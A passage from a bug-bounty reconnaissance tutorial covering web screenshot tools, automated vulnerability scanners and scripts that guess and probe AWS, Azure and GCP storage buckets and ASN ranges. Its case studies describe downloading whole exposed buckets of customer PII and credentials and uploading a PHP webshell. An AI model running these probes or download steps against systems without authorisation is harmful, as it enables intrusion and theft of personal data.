   api_keys.txt                   1 KB

5. Downloaded all files:
   wget -r -np https://old-backup.target.com/backups/

6. Contents:
   ├─ Full MySQL database dump
   ├─ Complete application source code
   ├─ 100,000 customer records (PII)
   ├─ API keys for AWS, Stripe, SendGrid
   └─ Admin credentials

7. Impact:
   - Complete data breach
   - Source code exposure
   - Credential compromise
   - Customer PII exposed

8. Bounty: $8,500

Key: Screenshot immediately showed directory listing
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Take screenshots of popular sites
cat > practice_urls.txt << EOF
https://example.com
https://github.com
https://stackoverflow.com
EOF

gowitness file -f practice_urls.txt
gowitness report serve
# Open http://localhost:7171

# Exercise 2: Use EyeWitness on test target
echo "http://testphp.vulnweb.com" > test.txt
echo "http://testhtml5.vulnweb.com" >> test.txt
python3 EyeWitness.py -f test.txt --web -d test_scan

# Exercise 3: httpx screenshots
echo "scanme.nmap.org" | httpx -screenshot -screenshot-path ./test/

# Exercise 4: Create custom screenshot analyzer
cat > analyze_screenshots.sh << 'EOF'
#!/bin/bash
# Analyze httpx JSON for interesting findings

JSON_FILE=$1

echo "=== Admin/Login Panels ==="
cat $JSON_FILE | jq -r 'select(.title | test("admin|login"; "i")) | .url'

echo ""
echo "=== Error Pages ==="
cat $JSON_FILE | jq -r 'select(.status_code >= 500) | .url'

echo ""
echo "=== Forbidden Pages ==="
cat $JSON_FILE | jq -r 'select(.status_code == 403) | .url'

echo ""
echo "=== Interesting Technologies ==="
cat $JSON_FILE | jq -r 'select(.tech != null) | "\(.url) -> \(.tech[])"'
EOF

chmod +x analyze_screenshots.sh

# Run it
cat urls.txt | httpx -json -o results.json
./analyze_screenshots.sh results.json
```

### 📊 Quick Reference

```bash
# EyeWitness
python3 EyeWitness.py -f urls.txt --web -d output

# Gowitness
gowitness file -f urls.txt --screenshot-path ./screens/
gowitness report serve  # View at localhost:7171

# Aquatone
cat domains.txt | aquatone -out report

# httpx screenshots
cat urls.txt | httpx -screenshot -screenshot-path ./screens/

# httpx with analysis
cat urls.txt | httpx -title -tech-detect -status-code -screenshot -json -o results.json

# Analyze httpx results
cat results.json | jq -r 'select(.title | test("admin|login"; "i")) | .url'
```

---

## Phase 8: Automated Vulnerability Scanning

### 🎯 Objective

**Identify known vulnerabilities and misconfigurations using automated scanners.**

### ⚠️ CRITICAL WARNING

```diff
! AUTOMATED SCANNERS ARE LOUD
! THEY SEND THOUSANDS OF REQUESTS
! THEY WILL TRIGGER WAF/IDS
! THEY CAN GET YOU BANNED

BEFORE RUNNING ANY SCANNER:
✓ Read bug bounty program rules CAREFULLY
✓ Check if automated scanning is allowed
✓ Start with PASSIVE/SAFE templates only
✓ Use HEAVY rate limiting
✓ Scan during OFF-PEAK hours
✓ Monitor for blocks/errors
✓ BE READY TO STOP IMMEDIATELY

IF IN DOUBT, DON'T SCAN - ASK FIRST
```

### Responsible Scanning Principles

```yaml
1. Permission First:
   - Explicit permission in scope
   - No "automated scanning prohibited" clause
   - Contact program if unsure

2. Start Conservative:
   - Begin with passive checks only
   - Test on 1-2 hosts first
   - Gradually increase if no issues

3. Rate Limiting is MANDATORY:
   - Max 20-50 requests/second
   - Add delays between requests
   - Limit concurrent connections

4. Timing Matters:
   - Off-peak hours (2AM-6AM target timezone)
   - Weekends
   - Never during known busy periods

5. Monitor Impact:
   - Watch for 429 Too Many Requests
   - Watch for 503 Service Unavailable
   - Stop immediately if issues arise

6. Validation:
   - ALWAYS manually validate findings
   - Remove false positives
   - Test exploitability carefully
```

### 🛠️ Tool 1: Nuclei (Template-Based Scanner)

#### What Makes Nuclei Special

```
Traditional Scanners:
- Scan for everything
- Noisy and slow
- Many false positives
- Hard to customize

Nuclei:
- Template-based (scan for specific things)
- Fast and efficient
- Community-driven templates
- Easy to customize
- Low false positive rate
```

#### Installation

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# List available templates
nuclei -tl

# Output shows template categories:
cves/
exposures/
misconfigurations/
vulnerabilities/
technologies/
default-logins/
takeovers/
```

#### Basic Usage

```bash
# Scan single URL
nuclei -u https://example.com

# Scan from file
nuclei -l urls.txt

# Scan with specific severity
nuclei -l urls.txt -severity critical,high

# Scan specific template category
nuclei -l urls.txt -t cves/
nuclei -l urls.txt -t exposures/
nuclei -l urls.txt -t misconfigurations/
```

#### Rate-Limited Production Scan

```bash
# RECOMMENDED for bug bounty
nuclei -l targets.txt \
  -severity critical,high \
  -rate-limit 30 \          # Max 30 requests/second
  -bulk-size 10 \           # Process 10 hosts at once
  -c 10 \                   # 10 concurrent templates
  -timeout 10 \             # 10 second timeout
  -retries 1 \              # Retry failed requests once
  -stats \                  # Show progress statistics
  -o nuclei_results.txt     # Save output
```

#### Template Selection

```bash
# CVE scanning only
nuclei -l urls.txt -t cves/ -severity critical,high

# Exposed files/configs
nuclei -l urls.txt -t exposures/

# Misconfigurations
nuclei -l urls.txt -t misconfigurations/

# Technology-specific
nuclei -l wordpress_sites.txt -t wordpress/
nuclei -l drupal_sites.txt -t drupal/

# Subdomain takeovers
nuclei -l subdomains.txt -t takeovers/

# Default credentials
nuclei -l urls.txt -t default-logins/

# Specific CVE
nuclei -l urls.txt -t cves/2021/CVE-2021-44228.yaml  # Log4j
```

#### Output Options

```bash
# JSON output
nuclei -l urls.txt -json -o results.json

# Markdown report
nuclei -l urls.txt -markdown-export report.md

# Multiple output formats
nuclei -l urls.txt \
  -json -o results.json \
  -markdown-export report.md \
  -stats

# Silent mode (only findings)
nuclei -l urls.txt -silent

# Verbose mode (debug)
nuclei -l urls.txt -v
```

#### Advanced Filtering

```bash
# Exclude specific templates
nuclei -l urls.txt -exclude-templates exposures/files/

# Include only specific tags
nuclei -l urls.txt -tags cve,rce,sqli

# Exclude templates by tag
nuclei -l urls.txt -exclude-tags dos,fuzz

# Only run new templates (added in last 30 days)
nuclei -l urls.txt -new-templates

# Custom template directory
nuclei -l urls.txt -t ~/my-custom-templates/
```

### 💡 Practical Nuclei Workflow

```bash
#!/bin/bash
# nuclei-scan.sh - Safe Nuclei scanning workflow

TARGET_LIST="$1"
OUTPUT="nuclei_scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT/{critical,high,medium,info}

echo "[+] Starting safe Nuclei scan..."
echo "    Targets: $(wc -l < $TARGET_LIST)"
echo "    Rate limit: 30 req/sec"
echo "    Time: $(date)"

# Phase 1: Critical vulnerabilities only (fast)
echo "[+] Phase 1: Scanning for critical vulnerabilities..."
nuclei -l $TARGET_LIST \
  -severity critical \
  -rate-limit 30 \
  -c 10 \
  -timeout 10 \
  -stats \
  -json \
  -o $OUTPUT/critical/results.json

CRITICAL_COUNT=$(cat $OUTPUT/critical/results.json 2>/dev/null | wc -l)
echo "    Found: $CRITICAL_COUNT critical issues"

if [ $CRITICAL_COUNT -gt 0 ]; then
  echo "[!] CRITICAL ISSUES FOUND - Review immediately!"
  cat $OUTPUT/critical/results.json | jq -r '.info.name' | sort -u
fi

# Phase 2: High severity (if no critical or asked to continue)
read -p "Continue with high severity scan? (y/n) " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
  echo "[+] Phase 2: Scanning for high severity issues..."
  nuclei -l $TARGET_LIST \
    -severity high \
    -rate-limit 30 \
    -c 10 \
    -timeout 10 \
    -stats \
    -json \
    -o $OUTPUT/high/results.json
  
  HIGH_COUNT=$(cat $OUTPUT/high/results.json 2>/dev/null | wc -l)
  echo "    Found: $HIGH_COUNT high severity issues"
fi

# Phase 3: Exposed files/configs (safe checks)
echo "[+] Phase 3: Checking for exposed files..."
nuclei -l $TARGET_LIST \
  -t exposures/files/ \
  -rate-limit 20 \
  -c 5 \
  -timeout 10 \
  -stats \
  -json \
  -o $OUTPUT/info/exposed_files.json

# Phase 4: Misconfigurations
echo "[+] Phase 4: Checking for misconfigurations..."
nuclei -l $TARGET_LIST \
  -t misconfigurations/ \
  -rate-limit 20 \
  -c 5 \
  -timeout 10 \
  -stats \
  -json \
  -o $OUTPUT/medium/misconfigs.json

# Generate summary report
echo "[+] Generating summary report..."
cat > $OUTPUT/SUMMARY.md << EOF
# Nuclei Scan Summary

**Scan Date:** $(date)
**Targets Scanned:** $(wc -l < $TARGET_LIST)

## Findings

### Critical: $CRITICAL_COUNT
\`\`\`
$(cat $OUTPUT/critical/results.json 2>/dev/null | jq -r '.info.name' | sort -u)
\`\`\`

### High: ${HIGH_COUNT:-0}
\`\`\`
$(cat $OUTPUT/high/results.json 2>/dev/null | jq -r '.info.name' | sort -u)
\`\`\`

### Exposed Files
\`\`\`
$(cat $OUTPUT/info/exposed_files.json 2>/dev/null | jq -r '.matched-at' | sort -u)
\`\`\`

## Next Steps

1. Manually validate all critical findings
2. Remove false positives
3. Test exploitability
4. Prepare detailed reports
EOF

echo ""
echo "[+] Scan complete!"
echo "    Results: $OUTPUT/"
echo "    Summary: $OUTPUT/SUMMARY.md"
echo ""
echo "    IMPORTANT: Manually validate ALL findings before reporting!"
```

### 🛠️ Tool 2: Nikto (Web Server Scanner)

#### Installation

```bash
# Kali Linux (pre-installed)
nikto

# Ubuntu/Debian
sudo apt install nikto -y

# From source
git clone https://github.com/sullo/nikto
cd nikto/program
perl nikto.pl -h
```

#### Basic Usage

```bash
# Scan single host
nikto -h https://example.com

# Specify port
nikto -h example.com -p 8080

# SSL/HTTPS
nikto -h https://example.com -ssl
```

#### Tuning (Selective Scanning)

```bash
# Nikto tuning options:
0 - File Upload
1 - Interesting Files
2 - Misconfiguration
3 - Information Disclosure
4 - Injection (XSS/Script/HTML)
5 - Remote File Retrieval
6 - Denial of Service
7 - Remote File Retrieval - Inside Web Root
8 - Command Execution
9 - SQL Injection
a - Authentication Bypass
b - Software Identification
c - Remote Source Inclusion

# Selective scan (interesting files only)
nikto -h https://example.com -Tuning 1

# Multiple options
nikto -h https://example.com -Tuning 123

# Exclude dangerous tests
nikto -h https://example.com -Tuning x6  # x = exclude, 6 = DoS
```

#### Output Options

```bash
# HTML report
nikto -h https://example.com -output report.html -Format html

# Text file
nikto -h https://example.com -output results.txt -Format txt

# CSV format
nikto -h https://example.com -output results.csv -Format csv

# Multiple formats
nikto -h https://example.com -output report -Format htm,txt,csv
```

#### Rate Limiting

```bash
# Add delay between requests (seconds)
nikto -h https://example.com -Pause 2

# Example: 2 second pause between each test
```

### 🛠️ Tool 3: WPScan (WordPress Scanner)

#### Installation

```bash
# Using gem
gem install wpscan

# Update database
wpscan --update

# Get API token (for vulnerability data)
# Register at https://wpscan.com/
wpscan --api-token YOUR_TOKEN
```

#### Basic Usage

```bash
# Basic scan
wpscan --url https://example.com

# Enumerate plugins
wpscan --url https://example.com --enumerate p

# Enumerate themes
wpscan --url https://example.com --enumerate t

# Enumerate users
wpscan --url https://example.com --enumerate u

# Enumerate everything
wpscan --url https://example.com --enumerate ap,at,u,cb,dbe
```

#### Detection Modes

```bash
# Passive detection (safe, no requests)
wpscan --url https://example.com --plugins-detection passive

# Mixed detection (balanced)
wpscan --url https://example.com --plugins-detection mixed

# Aggressive detection (thorough but noisy)
wpscan --url https://example.com --plugins-detection aggressive
```

#### Rate Limiting

```bash
# Throttle requests (milliseconds)
wpscan --url https://example.com --throttle 500

# Requests per minute
wpscan --url https://example.com --rpm 60

# Example: Max 60 requests per minute
```

#### Output Options

```bash
# JSON output
wpscan --url https://example.com --format json -o results.json

# CLI with colors
wpscan --url https://example.com --format cli-no-color -o results.txt
```

### 🏆 Case Study: Nuclei Finding Log4Shell

```
Hunter: @pdiscovery (ProjectDiscovery Team)
Platform: HackerOne
Target: [Multiple Companies]
Total Bounties: $250,000+

Timeline (December 2021):

Day 1: CVE-2021-44228 (Log4Shell) disclosed

Day 2: Nuclei template created
  - Template: cves/2021/CVE-2021-44228.yaml
  - Detection: ${jndi:ldap://...}
  - Response monitoring

Day 3-7: Mass scanning
  nuclei -l 10000_targets.txt \
    -t cves/2021/CVE-2021-44228.yaml \
    -rate-limit 50 \
    -c 20

Findings:
├─ 1,200+ vulnerable instances found
├─ Companies affected:
│   ├─ Major tech companies
│   ├─ Fortune 500
│   ├─ Government sites
│   └─ Critical infrastructure

Impact per finding:
- Remote Code Execution
- Complete server compromise
- Data breach potential

Bounty range: $5,000 - $50,000 per report
Total earned: $250,000+

Key: Fast template creation + automated scanning = huge success
Note: This was exceptional circumstances (zero-day)
```

### 🏆 Case Study: WPScan Plugin Vulnerability

```
Hunter: @samwcyo
Platform: Bugcrowd
Target: [Redacted E-commerce]
Bounty: $5,500

Process:

1. Identified WordPress site:
   whatweb https://blog.target.com
   → WordPress 5.8

2. Ran WPScan:
   wpscan --url https://blog.target.com \
          --enumerate ap \
          --plugins-detection mixed \
          --api-token TOKEN

3. Found:
   [!] Plugin: contact-form-7 v5.4.1
   [!] Vulnerability: Unrestricted File Upload
   [!] CVE: CVE-2020-35489
   [!] Severity: High

4. Researched exploit:
   - searchsploit contact-form-7
   - Found PoC code

5. Tested:
   - Created malicious file upload form
   - Uploaded PHP webshell
   - Gained code execution

6. Impact:
   - Remote Code Execution
   - Server compromise
   - Database access possible

7. Report: Critical - RCE via WordPress Plugin
   Bounty: $5,500

Key: WPScan + CVE database = Easy critical bugs
```

### 🛠️ Tool 4: testssl.sh (SSL/TLS Scanner)

#### Installation

```bash
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh
```

#### Usage

```bash
# Full SSL/TLS scan
./testssl.sh https://example.com

# Specific vulnerability checks
./testssl.sh --heartbleed https://example.com
./testssl.sh --poodle https://example.com
./testssl.sh --robot https://example.com

# Severity filtering
./testssl.sh --severity MEDIUM https://example.com

# JSON output
./testssl.sh --jsonfile results.json https://example.com

# Fast scan (common checks only)
./testssl.sh --fast https://example.com
```

### 🎯 Vulnerability Scanning Best Practices

```yaml
Phase 1: Preparation
  - Read program rules
  - Verify automated scanning allowed
  - Prepare target list
  - Set up monitoring

Phase 2: Conservative Start
  - Test on 1-2 hosts
  - Use passive templates only
  - Monitor for blocks
  - Verify no impact

Phase 3: Gradual Expansion
  - Increase to 10 hosts
  - Add more templates
  - Watch for rate limits
  - Check for false positives

Phase 4: Full Scan (if approved)
  - Scan all targets
  - Use rate limiting
  - Off-peak hours
  - Save all output

Phase 5: Validation
  - Manual verification
  - Remove false positives
  - Test exploitability
  - Document findings

Phase 6: Reporting
  - Clean reports
  - Reproduction steps
  - Impact assessment
  - Remediation advice
```

### ⚠️ When NOT to Use Automated Scanners

```diff
- ❌ Program says "No automated scanning"
- ❌ Production e-commerce during sales
- ❌ Financial services during trading hours
- ❌ Healthcare systems
- ❌ Government/military without explicit permission
- ❌ Critical infrastructure
- ❌ When you see rate limiting responses
- ❌ When WAF is blocking you
- ❌ During incidents/outages
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Nuclei on test site
nuclei -u http://testphp.vulnweb.com -t cves/

# Exercise 2: Safe template test
nuclei -u https://example.com -t technologies/ -rate-limit 10

# Exercise 3: WPScan practice
# Set up local WordPress
docker run -p 8080:80 wordpress

# Scan it
wpscan --url http://localhost:8080 --enumerate ap

# Exercise 4: Create custom Nuclei template
cat > my-test.yaml << 'EOF'
id: my-custom-check

info:
  name: Custom Exposed File Check
  author: yourname
  severity: medium
  description: Checks for custom exposed file

http:
  - method: GET
    path:
      - "{{BaseURL}}/secret.txt"
      
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        words:
          - "secret"
EOF

nuclei -u https://example.com -t my-test.yaml
```

### 📊 Quick Reference

```bash
# Nuclei
nuclei -l urls.txt -severity critical,high -rate-limit 30
nuclei -l urls.txt -t cves/ -severity critical
nuclei -l urls.txt -t exposures/ -rate-limit 20

# Nikto
nikto -h https://example.com -Tuning 123 -Pause 2

# WPScan
wpscan --url https://site.com --enumerate ap --throttle 500

# testssl
./testssl.sh --severity HIGH https://example.com

# Safe production scan
nuclei -l targets.txt \
  -severity critical \
  -rate-limit 20 \
  -c 5 \
  -timeout 10 \
  -stats \
  -o results.txt
```
---

## 🥷 Advanced Techniques

### Technique 1: Cloud Asset Discovery (AWS, Azure, GCP)

#### Understanding Cloud Infrastructure

```
Modern companies don't own servers anymore
They rent cloud infrastructure:

AWS (Amazon Web Services)
├─ S3 Buckets (file storage)
├─ EC2 Instances (virtual servers)
├─ Lambda Functions (serverless code)
├─ CloudFront (CDN)
└─ RDS (databases)

Azure (Microsoft)
├─ Blob Storage (files)
├─ Virtual Machines
├─ App Services
└─ Cosmos DB

GCP (Google Cloud)
├─ Cloud Storage (buckets)
├─ Compute Engine (VMs)
├─ Cloud Functions
└─ Cloud SQL

Common mistake: Companies forget to secure these
Result: Public data exposure = Easy critical bugs
```

### 🔍 AWS S3 Bucket Enumeration

#### Understanding S3 Buckets

```
S3 Bucket = Online storage folder
URL Format: https://BUCKET-NAME.s3.amazonaws.com
           or https://s3.amazonaws.com/BUCKET-NAME

Common naming patterns:
├─ company-backups
├─ company-dev
├─ company-prod
├─ company-assets
├─ company-images
├─ companyname-data
└─ prod-company-files

Problem: Many buckets are PUBLIC by accident
```

#### Finding S3 Buckets

##### Method 1: Common Naming Patterns

```bash
#!/bin/bash
# s3-enum.sh - Find S3 buckets for target

COMPANY="$1"

# Generate common bucket names
cat > bucket_names.txt << EOF
${COMPANY}
${COMPANY}-backup
${COMPANY}-backups
${COMPANY}-dev
${COMPANY}-prod
${COMPANY}-staging
${COMPANY}-test
${COMPANY}-assets
${COMPANY}-images
${COMPANY}-uploads
${COMPANY}-files
${COMPANY}-data
${COMPANY}-logs
${COMPANY}-public
${COMPANY}-private
${COMPANY}-web
${COMPANY}-app
${COMPANY}-api
backup-${COMPANY}
dev-${COMPANY}
prod-${COMPANY}
staging-${COMPANY}
${COMPANY}.com
www-${COMPANY}
${COMPANY}-www
${COMPANY}-website
EOF

echo "[+] Testing S3 bucket names for: $COMPANY"
echo "[+] Generated $(wc -l < bucket_names.txt) bucket names"

# Test each bucket
while read bucket; do
  # Method 1: Public listing test
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/")
  
  if [ "$response" != "404" ]; then
    echo "[+] FOUND: $bucket (HTTP $response)"
    
    # Try to list contents
    content=$(aws s3 ls s3://${bucket} --no-sign-request 2>&1)
    
    if [[ $content != *"Access Denied"* ]]; then
      echo "    [!] PUBLICLY READABLE!"
      echo "    Contents:"
      echo "$content" | head -5
      echo "    ..."
      
      # Save for later analysis
      echo $bucket >> found_buckets.txt
    fi
  fi
done < bucket_names.txt

echo ""
echo "[+] Scan complete!"
if [ -f found_buckets.txt ]; then
  echo "    Found buckets: found_buckets.txt"
fi
```

##### Method 2: From DNS/SSL Certificates

```bash
# Extract S3 buckets from subdomains
cat subdomains.txt | while read domain; do
  # Check CNAME records
  dig $domain CNAME +short | grep "s3"
done | sort -u > s3_from_dns.txt

# Example output:
# assets.target.com → target-assets.s3.amazonaws.com
# backup.target.com → target-backup-2024.s3.amazonaws.com
```

##### Method 3: From JavaScript Files

```bash
# Search JS files for S3 URLs
cat js_files.txt | while read js; do
  curl -s $js | grep -Eo "https?://[a-zA-Z0-9._-]+\.s3\.amazonaws\.com"
done | sort -u > s3_from_js.txt

# Also search for bucket names in configs
cat js_files.txt | while read js; do
  curl -s $js | grep -Eo '"bucket"\s*:\s*"[^"]+"' | cut -d'"' -f4
done | sort -u >> s3_buckets.txt
```

##### Method 4: Using Tools

```bash
# Tool 1: S3Scanner
pip3 install s3scanner

# Scan list of potential buckets
s3scanner scan --buckets-file bucket_names.txt

# Tool 2: AWS CLI
# List contents (requires public access or credentials)
aws s3 ls s3://bucket-name --no-sign-request

# Sync entire bucket (download everything)
aws s3 sync s3://bucket-name ./downloaded-bucket --no-sign-request

# Tool 3: s3-buckets-finder
git clone https://github.com/gwen001/s3-buckets-finder
python3 s3-buckets-finder.py --domain target.com
```

##### Method 5: GrayhatWarfare (Public Bucket Search)

```bash
# Web interface: https://buckets.grayhatwarfare.com
# Search for: target.com

# API (requires token)
curl "https://buckets.grayhatwarfare.com/api/v1/files/search?keywords=target.com" \
  -H "Authorization: Bearer YOUR_TOKEN"

# This searches through billions of files in public S3 buckets
```

#### Testing S3 Bucket Permissions

```bash
#!/bin/bash
# s3-test-permissions.sh

BUCKET="$1"

echo "[+] Testing permissions for: $BUCKET"

# Test 1: Read (List)
echo "[*] Testing READ permission..."
aws s3 ls s3://${BUCKET} --no-sign-request 2>&1 | tee test_read.txt

if grep -q "Access Denied" test_read.txt; then
  echo "    [-] READ: Denied"
else
  echo "    [+] READ: Allowed (FINDING!)"
fi

# Test 2: Write (Upload)
echo "[*] Testing WRITE permission..."
echo "test" > test_file.txt
aws s3 cp test_file.txt s3://${BUCKET}/test_file.txt --no-sign-request 2>&1 | tee test_write.txt

if grep -q "Access Denied" test_write.txt; then
  echo "    [-] WRITE: Denied"
else
  echo "    [!] WRITE: Allowed (CRITICAL!)"
  # Clean up
  aws s3 rm s3://${BUCKET}/test_file.txt --no-sign-request
fi

# Test 3: ACL Read
echo "[*] Testing ACL READ permission..."
aws s3api get-bucket-acl --bucket ${BUCKET} --no-sign-request 2>&1 | tee test_acl.txt

if grep -q "Access Denied" test_acl.txt; then
  echo "    [-] ACL READ: Denied"
else
  echo "    [+] ACL READ: Allowed (FINDING!)"
fi

rm -f test_*.txt
```

### 🔍 Azure Blob Storage Enumeration

#### Understanding Azure Blobs

```
URL Format: https://ACCOUNT.blob.core.windows.net/CONTAINER

Example:
https://companydata.blob.core.windows.net/backups
        └─ account name                    └─ container

Common patterns:
├─ companyname.blob.core.windows.net
├─ companynameprod.blob.core.windows.net
├─ companynamedev.blob.core.windows.net
└─ companydata.blob.core.windows.net
```

#### Finding Azure Blobs

```bash
#!/bin/bash
# azure-enum.sh

COMPANY="$1"

# Generate account names
cat > azure_accounts.txt << EOF
${COMPANY}
${COMPANY}prod
${COMPANY}dev
${COMPANY}staging
${COMPANY}test
${COMPANY}data
${COMPANY}backup
${COMPANY}backups
${COMPANY}files
${COMPANY}assets
EOF

# Generate container names
cat > azure_containers.txt << EOF
backups
backup
data
files
public
private
images
uploads
documents
logs
EOF

echo "[+] Testing Azure Blob Storage for: $COMPANY"

while read account; do
  # Test if account exists
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://${account}.blob.core.windows.net/")
  
  if [ "$response" != "404" ]; then
    echo "[+] Account exists: ${account}"
    
    # Test containers
    while read container; do
      url="https://${account}.blob.core.windows.net/${container}?restype=container&comp=list"
      content=$(curl -s "$url")
      
      if [[ $content != *"AuthenticationFailed"* ]] && [[ $content != *"ResourceNotFound"* ]]; then
        echo "    [!] PUBLIC CONTAINER: ${container}"
        echo "        URL: https://${account}.blob.core.windows.net/${container}"
      fi
    done < azure_containers.txt
  fi
done < azure_accounts.txt
```

#### Tool: MicroBurst (PowerShell)

```powershell
# Install
git clone https://github.com/NetSPI/MicroBurst
Import-Module MicroBurst.psm1

# Enumerate storage accounts
Invoke-EnumerateAzureBlobs -Base companyname

# Output shows:
# - Valid account names
# - Public containers
# - Accessible files
```

### 🔍 Google Cloud Storage (GCP) Enumeration

#### Understanding GCS Buckets

```
URL Format: https://storage.googleapis.com/BUCKET-NAME
           or https://BUCKET-NAME.storage.googleapis.com

Bucket naming:
├─ company-backups
├─ company_production
├─ company.com
└─ www.company.com
```

#### Finding GCS Buckets

```bash
#!/bin/bash
# gcs-enum.sh

COMPANY="$1"

# Generate bucket names (similar to S3)
cat > gcs_buckets.txt << EOF
${COMPANY}
${COMPANY}-backups
${COMPANY}-prod
${COMPANY}-production
${COMPANY}-staging
${COMPANY}_backups
${COMPANY}_prod
${COMPANY}.com
www.${COMPANY}.com
EOF

echo "[+] Testing GCS buckets for: $COMPANY"

while read bucket; do
  # Test bucket existence and permissions
  response=$(curl -s "https://storage.googleapis.com/storage/v1/b/${bucket}")
  
  if [[ $response != *"Not Found"* ]]; then
    echo "[+] Bucket exists: $bucket"
    
    # Try to list objects
    objects=$(curl -s "https://storage.googleapis.com/storage/v1/b/${bucket}/o")
    
    if [[ $objects == *"items"* ]]; then
      echo "    [!] PUBLICLY READABLE!"
      echo "    $objects" | jq -r '.items[].name' | head -5
    fi
  fi
done < gcs_buckets.txt
```

#### Tool: GCPBucketBrute

```bash
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
python3 gcpbucketbrute.py -k companyname -w wordlist.txt
```

### 🏆 Case Study: S3 Bucket = $25,000

```
Hunter: @Th3G3nt3lman
Platform: HackerOne
Target: [Redacted Fintech Startup]
Bounty: $25,000

Discovery Process:

1. Basic recon showed company name: "FinanceApp"

2. Generated S3 bucket names:
   cat > buckets.txt << EOF
   financeapp
   financeapp-backup
   financeapp-backups
   financeapp-prod
   financeapp-production
   EOF

3. Tested each bucket:
   aws s3 ls s3://financeapp-backup --no-sign-request

4. Found:
   [✓] Bucket exists and is readable!
   
   Contents:
   2024-01-15 database-dump.sql         5.2 GB
   2024-01-15 user-data-export.csv      850 MB
   2024-01-15 transactions.json         2.1 GB
   2024-01-15 api-keys.txt              15 KB

5. Downloaded everything:
   aws s3 sync s3://financeapp-backup ./backup --no-sign-request

6. Analysis revealed:
   ├─ Complete MySQL database dump (50M records)
   ├─ User PII (names, emails, SSN, addresses)
   ├─ Bank account information
   ├─ Transaction history
   ├─ Credit card details (encrypted but keys in api-keys.txt)
   └─ AWS credentials for production

7. Impact:
   - Complete data breach
   - Customer PII exposure
   - Financial data compromise
   - Infrastructure access via leaked AWS keys

8. Report: Critical - Public S3 Bucket with Customer Data
   Bounty: $25,000
   
   Timeline:
   - 20 minutes to find bucket
   - 2 hours to download and analyze
   - Immediate critical severity
   
Key: Simple bucket name guessing = Massive data breach
```

---

### Technique 2: ASN & IP Range Enumeration

#### Understanding ASN (Autonomous System Number)

```
What is ASN?

Internet = Millions of networks
Each major organization owns a network = Autonomous System
Each AS has a unique number = ASN

Example:
AS15169 = Google
AS16509 = Amazon (AWS)
AS32934 = Facebook

Why it matters for bug bounty:
Company's ASN = All their IP addresses
All IPs = All their servers
All servers = More attack surface
```

#### Finding Company's ASN

##### Method 1: WHOIS Lookup

```bash
# Get ASN from IP
whois 8.8.8.8 | grep -i "origin"
# Output: OriginAS: AS15169

# Get ASN from domain
whois google.com | grep -i "origin\|asn"
```

##### Method 2: BGP Lookup Tools

```bash
# Hurricane Electric BGP Toolkit
# Visit: https://bgp.he.net/
# Search: "Company Name" or domain

# Example output:
AS54825 - Example Corp
IPv4: 203.0.113.0/24
      198.51.100.0/22
IPv6: 2001:db8::/32
```

##### Method 3: Using Amass

```bash
# Amass can find ASN automatically
amass intel -org "Example Corp" -whois

# Output:
ASN: 54825
Description: EXAMPLE-CORP
IP Ranges:
  203.0.113.0/24
  198.51.100.0/22
```

##### Method 4: BGPView API

```bash
# Search by organization
curl -s "https://api.bgpview.io/search?query_term=Example%20Corp" | jq '.'

# Get ASN details
curl -s "https://api.bgpview.io/asn/54825" | jq '.'

# Get IP prefixes
curl -s "https://api.bgpview.io/asn/54825/prefixes" | jq -r '.data.ipv4_prefixes[].prefix'

# Output:
# 203.0.113.0/24
# 198.51.100.0/22
```

#### Complete ASN Enumeration Workflow

```bash
#!/bin/bash
# asn-recon.sh - Complete ASN reconnaissance

COMPANY="$1"
OUTPUT="asn_recon_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT/{asn,ips,hosts,services}

echo "[+] ASN Reconnaissance for: $COMPANY"

# Phase 1: Find ASNs
echo "[+] Phase 1: Finding ASNs..."
amass intel -org "$COMPANY" -whois | tee $OUTPUT/asn/amass_output.txt

# Extract ASN numbers
grep "ASN:" $OUTPUT/asn/amass_output.txt | cut -d' ' -f2 | sort -u > $OUTPUT/asn/asn_numbers.txt

echo "    Found $(wc -l < $OUTPUT/asn/asn_numbers.txt) ASNs"

# Phase 2: Get IP ranges for each ASN
echo "[+] Phase 2: Extracting IP ranges..."
while read asn; do
  echo "    Processing $asn..."
  
  # BGPView API
  curl -s "https://api.bgpview.io/asn/${asn#AS}/prefixes" | \
    jq -r '.data.ipv4_prefixes[].prefix' >> $OUTPUT/ips/ip_ranges.txt
  
  # Also try whois
  whois -h whois.radb.net -- "-i origin $asn" | \
    grep -Eo "([0-9.]+){4}/[0-9]+" >> $OUTPUT/ips/ip_ranges.txt
    
done < $OUTPUT/asn/asn_numbers.txt

# Remove duplicates
sort -u $OUTPUT/ips/ip_ranges.txt -o $OUTPUT/ips/ip_ranges_unique.txt

echo "    Found $(wc -l < $OUTPUT/ips/ip_ranges_unique.txt) unique IP ranges"

# Phase 3: Expand CIDR to individual IPs (for small ranges)
echo "[+] Phase 3: Expanding IP ranges..."

# Only expand ranges smaller than /22 (1024 IPs)
while read range; do
  prefix=$(echo $range | cut -d'/' -f2)
  
  if [ $prefix -ge 22 ]; then
    # Use mapcidr to expand
    echo $range | mapcidr -silent >> $OUTPUT/ips/all_ips.txt
  else
    echo "    Skipping $range (too large)"
    echo $range >> $OUTPUT/ips/large_ranges.txt
  fi
done < $OUTPUT/ips/ip_ranges_unique.txt

# Phase 4: Reverse DNS lookup
echo "[+] Phase 4: Reverse DNS lookups..."
cat $OUTPUT/ips/all_ips.txt 2>/dev/null | \
  hakrevdns -d | \
  tee $OUTPUT/hosts/reverse_dns.txt

# Phase 5: Find web services
echo "[+] Phase 5: Discovering web services..."
cat $OUTPUT/hosts/reverse_dns.txt | \
  httpx -silent -title -tech-detect -status-code \
  -o $OUTPUT/services/web_services.txt

# Phase 6: Port scanning (top ports)
echo "[+] Phase 6: Port scanning top services..."
naabu -l $OUTPUT/ips/all_ips.txt \
  -top-ports 100 \
  -rate 100 \
  -silent \
  -o $OUTPUT/services/open_ports.txt

# Phase 7: Generate report
echo "[+] Generating summary..."
